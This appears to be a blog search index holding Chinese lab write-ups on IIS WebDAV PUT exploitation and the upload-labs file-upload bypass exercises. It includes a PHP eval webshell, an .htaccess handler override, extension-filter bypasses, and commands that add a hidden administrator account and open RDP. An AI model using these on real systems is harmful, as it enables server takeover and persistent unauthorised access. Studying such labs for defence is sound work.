<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[01-无检测_IIS_PUT]]></title>
    <url>%2F2018%2F10%2F17%2F01-%E6%97%A0%E6%A3%80%E6%B5%8B-IIS-PUT%2F</url>
    <content type="text"><![CDATA[一、环境设置IIS 6.0 默认网站 服务器自身问题 如下界面： 二、测试过程1、使用burp抓包测试将GET 改为 OPTIONS，发现几乎所有的HTTP方法都可用，尤其是使用put方法 2、使用IIS PUT Scaner扫描 3、使用isswrite工具写写入一句话3.1下面出了个问题，写入文件失败：显示未授权 3.2将文件目录权限更改后可成功上传（主要是练习使用） 上传成功 4、使用move方法更改文件后缀更改刚刚提交的txt位asp，将文件变成可执行的脚本文件。 5、菜刀连接5.1菜刀连接成功 5.2菜刀提权失败 5.3菜刀-&gt;右键上传文件-&gt;上传大马 6、提权6.1通过菜刀上传大马后输入密码连接上，查看 组件支持 6.2 脚本探测 6.3 可读可写目录 6.4尝试执行CMD命令CMD2执行命令失败 6.5上传自己的cmd.exeC:\WINDOWS\Temp\Cmd.exe 替换为我们上传的cmd.exe路径，执行命令 whoami如下显示说明是网络用户 6.6查看该主机信息systeminfo 查看操作系统版本信息、目录信息、补丁信息 用户信息 net user 进程服务信息 tasklist /svc 端口开放信息 netstat -ano 6.7 使用pr提权注：KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权 6.7.1添加用户，并提升为管理员权限添加用户 net user username passwd /add 执行失败 6.7.2上传pr.exe注：找到可读可写的目录，注意不要包含空格，exp后缀可更改。 C:\inetpub\wwwroot\pr.com 6.7.3上传成功后，执行该文件后面加上命令如下:C:\inetpub\wwwroot\pr.com &quot;whoami&quot; 6.7.4添加新用户并添加进管理员组（注：执行不成功多试几次、管理员用户组名可能更改了） net user test test123456 /add 添加用户名为test，密码为test123456 net user test$ test123456 /add 添加隐藏用户（命令行不可见，用户管理可见，更进一步修改注册表，用户管理不可见，注册表可见） net user test /del 删除用户test net localgroup administrators test /add 将test添加到管理员组 net localgroup administrators 查看管理员用户组成员 运行 compmgmt.msc 计算机管理查看 已经添加 test 用户 添加到管理员组 8.8 开启3389 ，远程连接8.8.1查找3389端口 注册表读取 8.8.2开3389，直接上传开启3389的批处理c:\inetpub\wwwroot\3389.bat pr执行 查看端口开放情况，已开启3389 8.9 远程连接test test123456 192.168.16.128 3389 总结：1、漏洞原理：服务器开启了webdav的组件导致的可以扫描到当前的操作， 具体操作可以通过webdav的OPTION来查询是否支持PUT。 2、利用方法：使用ISS PUT Scanner 扫描目标网段，找到后使用 isswrite的put写入一句话， 再使用move将一句话的后缀改为可解析的。 3、提取上传cmd.exe,再上传pr.exe进行pr提权,使用pr添加具有管理员权限的用户。 上传开启3389的批处理文件，使用pr执行，开启3389，远程连接。 参考https://www.cnblogs.com/tdcqma/p/6125789.html https://www.2cto.com/article/201307/228165.html]]></content>
      <tags>
        <tag>File_Upload</tag>
        <tag>root</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[upload-labs]]></title>
    <url>%2F2018%2F09%2F04%2F%20upload-labs%2F</url>
    <content type="text"><![CDATA[upload-labs简介漏洞环境源码下载https://github.com/c0ny1/upload-labs 参考Upload-labs通关手册 配置一般直接将源码放在 www hdocs wwwroot 网站目录下 文件上传思维导图文件上传分类文件上传思路 Pass-01 客户端JS验证绕过初步测试上传界面提示说：该文件不允许上传，请上传.jpg|.png|.gif类型的文件,当前文件类型为：.php通过调试判断为本地验证 源代码分析（客户端js代码）&lt;script type=&quot;text/javascript&quot;&gt; function checkFile() { var file = document.getElementsByName(&apos;upload_file&apos;)[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;请选择要上传的文件!&quot;); return false; } //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) { var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; } } &lt;/script&gt; 关键代码 var allow_ext = &quot;.jpg|.png|.gif&quot;; 只允许上传 jpg png gif Payload1、burpsuit抓包改包1、更改后缀，然后burpsuit抓包抓包2、改包上传成功3、测试能否执行和连接http://192.168.10.11/upload-labs/upload/ma.php菜刀连接 2、更改本地js上传或者直接禁用JS1、Firefox禁用js2、打开调试修改 3、上传图片马直接上传图片马 Pass-02 绕过MIME检查（白名单）初步尝试尝试上传文件，可以看到是在服务端进行验证 查看源代码服务端代码 $is_upload = false; $msg = null; if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;)) { if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) { $img_path = UPLOAD_PATH . $_FILES[&apos;upload_file&apos;][&apos;name&apos;]; $is_upload = true; } } else { $msg = &apos;文件类型不正确，请重新上传！&apos;; } } else { $msg = UPLOAD_PATH.&apos;文件夹不存在,请手工创建！&apos;; } } 关键代码 if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;)) 在服务端对数据包的MIME进行检查，即判断content-type ；修改content-type绕过： image/jpeg image/png image/gif Payload1、上传一句话，burpsuite抓包改包2、抓包后修改content-type为 image/gif3、上传成功，执行成功，菜刀连接 知识点之 MIMEMIME简介全名叫多用途互联网邮件扩展（Multipurpose Internet Mail Extensions），最初是为了将纯文本格式的电子邮件扩展到可以支持多种信息格式而定制的。后来被应用到多种协议里，包括我们常用的HTTP协议。 MIME的常见形式是一个主类型加一个子类型，用斜线分隔。比如text/html、application/javascript、image/png等。 在访问网页时，MIME type帮助浏览器识别一个HTTP请求返回的是什么内容的数据，应该如何打开、如何显示。 文件后缀与MIMU的区别一个是操作系统中标注文件的，一个是邮件和HTTP协议中用来标注网络数据的。 分类（独立请求和Multipart 类型）独立请求类型 描述 典型示例 text 表明文件是普通文本，理论上是可读的语言 text/plain, text/html, text/css, text/javascript image 表明是某种图像。不包括视频，但是动态图（比如动态gif）也使用image类型 image/gif, image/png, image/jpeg, image/bmp, image/webp audio 表明是某种音频文件 audio/midi, audio/mpeg, audio/webm, audio/ogg, audio/wav video 表明是某种视频文件 video/webm, video/ogg application 表明是某种二进制数据 application/octet-stream, application/pkcs12, application/vnd.mspowerpoint, application/xhtml+xml, application/xml, application/pdf, application/json Multipart 类型multipart/form-data multipart/byteranges 常见类型图片类型图片类型是在网页中使用的，唯一被广泛识别以及考虑过web安全的类型： MIME 类型 图片类型 image/gif GIF 图片 (无损耗压缩方面被PNG所替代) image/jpeg JPEG 图片 image/png PNG 图片 image/svg+xml SVG图片 (矢量图) application/octet-stream这是应用程序文件的默认值。意思是 未知的应用程序文件 ，浏览器一般不会自动执行或询问执行 text/plain文本文件默认值。意思是 未知的文本文件 ，浏览器认为是可以直接展示的 text/css任何一个CSS文件想要在网页上被解释执行就必须为text/css 文件。但是服务器经常不会分辨出使用.css后缀的CSS文件 text/html所有的HTML内容都应该使用这种类型。XHTML的其他MIME类型（如application/xml+html）现在基本不再使用（HTML5统一了这些格式）。 multipart/form-datamultipart/form-data 可用于HTML表单从浏览器发送信息给服务器。作为多部分文档格式，它由边界线（一个由’–’开始的字符串）划分出的不同部分组成。每一部分有自己的实体，以及自己的 HTTP 请求头，Content-Disposition和 Content-Type 用于文件上传领域，最常用的 (Content-Length 因为边界线作为分隔符而被忽略）。 参考MIME 类型 Pass-03 上传特殊可解析后缀文件（黑名单）初步测试1、上传phpinfo.php失败，服务端对图片进行了后缀验证2、上传houzui.xxx成功，可以判断使用了黑名单策略（不能上传.asp .aspx .php .jsp 后缀的文件），但是执行失败。3、尝试上传 phtml php3 php4 php5 PHP phtm后缀的文件成功上传 houzui.php3 ,测试能够执行，菜刀连接成功。 注意：例如phtml php3 php4 php5 PHP phtm这些后缀名首先得让服务器支持这些解析为php脚本运行，httpd.conf配置文件（apache/conf/hpptd.conf）中可以查看设置。 服务端代码分析$is_upload = false; $msg = null; if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], UPLOAD_PATH. &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) { $img_path = UPLOAD_PATH .&apos;/&apos;. $_FILES[&apos;upload_file&apos;][&apos;name&apos;]; $is_upload = true; } } else { $msg = &apos;不允许上传.asp,.aspx,.php,.jsp后缀文件！&apos;; } } else { $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; } } 分析 关键代码黑名单 $deny_ext = array(&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;); 文件名后缀在黑名单中则不允许上传 if(!in_array($file_ext, $deny_ext)) strrchr() 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符 总结:服务器端检查流程 服务端先去除文件名后面的点，然后取最后面的点后面的字符（即后缀），将其转换为小写（此处避免了大小写绕过黑名单），去除字符串::$DATA（此处见pass-8）,最后去除该后缀首尾的空字符。 服务端采用黑名单机制不允许上传一些特定后缀的文件，本关是通过上传一些特殊可解析后缀( php3 php4 php5 phtml phtm)文件来绕过检查。 Pass-04 上传.htaccess绕过（黑名单）测试过程1、上传 houzui.php失败。 2、上传houzui.xxx成功，但不能执行；可以判断是黑名单机制 3、上传houzui.php3失败，黑名单可能覆盖了几乎所有的特殊后缀 4、看提示，几乎将所有特殊可执行后缀文件全部过滤掉了本pass禁止上传 .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf 后缀文件！ 5、尝试上传 .htaccess文件，文件内容如下: SetHandler application/x-httpd-php 这样使得所有文件都会解析为php 6、成功上传 houzui.xxx,且执行成功 服务端代码$is_upload = false; $msg = null; if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) { $img_path = UPLOAD_PATH . $_FILES[&apos;upload_file&apos;][&apos;name&apos;]; $is_upload = true; } } else { $msg = &apos;此文件不允许上传!&apos;; } } else { $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; } } 与pass-03相似，只是黑名单包含了更多特殊可执行文件 知识点之 .htaccess文件参拷: apache的.htaccess文件作用和相关浅析 简介在我们不能修改httpd.conf文件时，我们可以通过修改.htaccess文件；.htaccess可以看作是httpd.conf的衍生品，它起着和httpd.conf相同的作用， .htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。 .htaccess的基本作用 URL重写、自定义错误页面 MIME类型配置 访问权限控制等 主要体现在伪静态的应用 图片防盗链 自定义404错误页面 阻止/允许特定IP/IP段 目录浏览与主页 禁止访问指定文件类型 文件密码保护 启用方式:1、找到httpd.conf,查找AllowOverride。启用AllowOverride改为 AllowOverride all 2、打开mod_rewrite机制，即还是在.httpd.conf中查找mod_rewrite.so；作用是在httpd.conf外重写配置； Pass-05 后缀大小写绕过（黑名单）测试过程1、上传houzui.php 失败 2、上传houzui.xxx成功，但执行失败，应该是采用了黑名单机制； 3、上传 .htaccess失败 4、上传 houzui1.Php成功，执行成功，菜刀连接 服务端代码分析$is_upload = false; $msg = null; if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) { $img_path = UPLOAD_PATH . &apos;/&apos; . $file_name; $is_upload = true; } } else { $msg = &apos;此文件不允许上传&apos;; } } else { $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; } } 分析 与前面相比缺少 $file_ext = strtolower($file_ext); //转换为小写 没有将后缀转为小写 Pass-06 后缀加空格绕过（黑名单）测试过程1、上传houzui.php失败 2、上传houzui.xxx成功，但执行失败，猜测是黑名单机制 3、.htaccess houzui.pHp，过滤了所有特殊可执行文件 4、后缀名后面添加空格绕过 服务端代码$is_upload = false; $msg = null; if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) { $img_path = UPLOAD_PATH . &apos;/&apos; . $file_name; $is_upload = true; } } else { $msg = &apos;此文件不允许上传&apos;; } } else { $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; } } 分析：与之前相比缺少 $file_ext = trim($file_ext); //首尾去空 Pass-07 后缀加点绕过(黑名单)初步测试过程1、上传 houzui.php失败 2、上传houzui.xxx成功，但执行失败；应该是黑名单机制 3、上传 .htaccess houzui1.Php失败，特殊可解析文件被过滤 服务端代码$is_upload = false; $msg = null; if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) { $img_path = UPLOAD_PATH . &apos;/&apos; . $file_name; $is_upload = true; } } else { $msg = &apos;此文件不允许上传&apos;; } } else { $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; } } 分析与之前不同在于 $file_name = deldot($file_name);//删除文件名末尾的点 没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过： Pass-08 ::$DATA绕过（黑名单）初步测试过程1、上传houzhui.php失败,上传houzhui.xxx成功，但执行失败，猜测是黑名单机制。 2、.htaccess houzui.Php 后缀加空格 后缀加点 失败 服务端源代码$is_upload = false; $msg = null; if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) { $img_path = UPLOAD_PATH . &apos;/&apos; . $file_name; $is_upload = true; } } else { $msg = &apos;此文件不允许上传&apos;; } } else { $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; } } 与前面不同之处在没有 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA 没有对后缀名进行去”::$DATA”处理，利用windows特性，可在后缀名中加” ::$DATA”绕过：houzuidata.php::$DATA 生成houzuidata.php &lt;?php @eval($_POST[‘test’]); echo “success”;?&gt; Payload 知识点之 NTFS ADS简介NTFS ADS简介NTFS流全称为NTFS交换数据流（NTFS Alternate Data Streams）,ADS的诞生是为了兼容Hierarchical File System 。 HFS–分层文件系统，是由苹果公司推出的文件系统，其工作模式是将不同数据存在在不同的分支文件，文件数据存放在数据分支而文件参数存在资源分支。类似的，NTFS流使用资源派生来维持宿主文件相关的信息。ADS有点类似文件的属性信息一样，依附于文件的传统边界之外。 ADS实列新建一个文件，命名为 test.txt,该文件即是宿主文件；打开文件，输入内容 “test”.在该目录下执行命令 echo &quot;This is a stream&quot; &gt; test.txt:stream.txt 建立后，cmd不会有任何提示且对于Windows资源管理器来说宿主文件没有发生任何变化，包括其大小，修改时间。这是因为windos下不是所有程序都能支持ADS导致的。同样 dir、type等也不能看到。Notepad能够部分支持ADS,可以打开 test.txt:stream.txt，但是notepad也不能完全支持，另存为时会出现参数错误。 **注意1、修改宿主文件的内容不会影响流的内容 2、修改流的内容不会影响宿主文件的内容在测试中发现，如果上传的文件名字为：test.php::$DATA，会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析。假设我们需要上传的文件内容为：&lt;?php phpinfo();?&gt;**下面是上传是会出现的现象：上传的文件名 服务器表面现象 生成的文件内容 Test.php:a.jpg 生成Test.php 空 Test.php::$DATA 生成test.php &lt;?php phpinfo();?&gt; Test.php::$INDEX_ALLOCATION 生成test.php文件夹 Test.php::$DATA\0.jpg 生成0.jpg &lt;?php phpinfo();?&gt; PS: 上传test.php:a.jpg的时候其实是在服务器上正常生成了一个数据流文件，可以通过notepad test.php:a.jpg查看内容，而test.php为空也是正常的。 根据第二个现象，我们可以bypass一些黑名单验证。 后面我加\0测试的时候是想截断后面的东西，但是发现windows会无视”/””\”这两个符号前面的东西，只识别这俩符号后的字符串。(由于windows把\ /当成了目录，而上传只认识文件名所导致的) 参考 在上传文件后缀名加上::$DATA绕过检测，这个::$DATA是什么东西啊 Pass-09测试过程1、上传houzui.php失败，上传houzui.xxx成功，但是执行失败；猜测是黑名单机制 2、上传 .htaccess houzui1.Php houzui.php空格 houzui.php. houzuidata.php::$DATA失败 白盒测试$is_upload = false; $msg = null; if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) { $img_path = UPLOAD_PATH . &apos;/&apos; . $file_name; $is_upload = true; } } else { $msg = &apos;此文件不允许上传&apos;; } } else { $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; } } 分析关键不同之处在于这里再相关判断后，保存时使用的文件名称是 $file_name(去除末尾的点后) $img_path = UPLOAD_PATH . &apos;/&apos; . $file_name; 上传文件名为 houzui.php. . Pass-10 双写绕过（黑名单）初步测试1、上传houzui.php成功，但是发现后缀的php被替换为了空2、上传houzui.pphphp成功 服务端代码$is_upload = false; $msg = null; if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = 